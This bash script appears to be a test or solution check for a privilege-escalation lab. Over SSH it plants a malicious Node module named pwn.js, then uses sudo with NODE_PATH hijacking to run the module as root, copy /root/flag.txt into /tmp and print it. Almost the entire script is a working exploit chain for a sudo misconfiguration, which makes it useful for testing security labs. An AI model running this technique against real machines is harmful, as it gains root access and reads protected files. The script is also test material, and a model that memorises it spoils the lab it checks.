#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat > /home/lowpriv/nodehijack/pwn.js <<'\''EOF'\''
const fs = require("fs");
fs.writeFileSync("/tmp/sudonodeflag", fs.readFileSync("/root/flag.txt"));
module.exports = {};
EOF
sudo -n NODE_PATH=/home/lowpriv/nodehijack node -e "require(\"pwn\")"
cat /tmp/sudonodeflag
')"
assert_root_output "${out}"
